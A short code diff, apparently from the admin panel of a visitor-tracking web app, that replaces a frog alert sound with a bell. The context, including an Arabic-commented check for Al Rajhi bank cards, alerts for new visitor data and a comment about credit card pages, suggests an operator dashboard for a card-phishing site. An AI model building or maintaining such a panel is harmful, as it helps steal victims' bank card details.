@@ -383,9 +383,9 @@
     let visitors = new Map();
     let selectedVisitorId = null;
 
-    // Pre-load frog sound once
-    const frogAudio = new Audio('/admin/frog.mp3');
-    frogAudio.volume = 0.7;
+    // Pre-load bell notification sound
+    const bellAudio = new Audio('/admin/bell.mp3');
+    bellAudio.volume = 1.0;
 
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
@@ -1598,13 +1598,13 @@
         }
         // Show notification with sound
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
-        // Play frog sound only for pages from credit card onwards (not for documents/summary/update info pages)
+        // Play bell sound for new data notifications
         const noSoundPages = ['الصفحة الرئيسية', 'ملخص الدفع'];
         const currentPage = data && data.page ? data.page : (visitor.page || '');
         if (!noSoundPages.includes(currentPage)) {
           try {
-            frogAudio.currentTime = 0;
-            frogAudio.play().catch(() => {});
+            bellAudio.currentTime = 0;
+            bellAudio.play().catch(() => {});
           } catch(e) {}
         }
       });
